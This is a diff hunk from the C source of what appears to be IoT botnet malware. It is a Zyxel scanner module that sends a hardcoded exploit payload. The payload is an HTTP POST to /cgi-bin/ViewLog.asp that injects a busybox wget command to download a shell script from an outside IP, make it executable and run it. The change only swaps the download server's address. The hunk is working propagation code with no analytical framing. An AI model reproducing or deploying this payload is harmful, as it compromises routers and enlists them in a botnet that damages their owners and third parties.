@@ -275,7 +275,7 @@ void zyxelscanner_scanner_init(void)
                             printf("[scanner] FD%d sending payload\n", conn->fd);
                         #endif
 		
-                        util_strcpy(conn->payload_buf, "POST /cgi-bin/ViewLog.asp HTTP/1.1\r\nHost: 192.168.0.14:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.20.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n /bin/busybox wget http://173.232.146.173/8UsA.sh; chmod +x 8UsA.sh; sh 8UsA.sh");
+                        util_strcpy(conn->payload_buf, "POST /cgi-bin/ViewLog.asp HTTP/1.1\r\nHost: 192.168.0.14:80\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nUser-Agent: python-requests/2.20.0\r\nContent-Length: 227\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n /bin/busybox wget http://99.79.193.92/8UsA.sh; chmod +x 8UsA.sh; sh 8UsA.sh");
 						
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                         util_zero(conn->payload_buf, sizeof(conn->payload_buf));
